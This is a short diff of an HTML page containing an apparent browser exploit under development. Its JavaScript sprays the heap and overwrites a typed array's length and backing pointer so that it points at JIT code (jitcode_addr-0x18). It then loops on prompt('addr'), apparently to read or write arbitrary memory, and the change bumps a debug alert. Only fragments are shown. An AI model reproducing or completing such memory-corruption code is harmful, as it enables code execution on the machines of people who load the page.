@@ -1,5 +1,5 @@
 <script>	
-alert("start36");
+alert("start37");
 function func(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -152,7 +152,8 @@ spray[spray_index][typedarray_index+0x30/4]=0x10000;//length
 spray[spray_index][typedarray_index+0x38/4]=jitcode_addr-0x18;//addr;
 var jit_index=typedarray_index+0x38/4;
 var typedarray=spray[spray_index];
-arrcvs[0]=0xAAAA;
+var myarr=arrcvs[0];
+myarr[0]=0xAAAA;
 while(1){
 a=prompt("addr");
 b="";
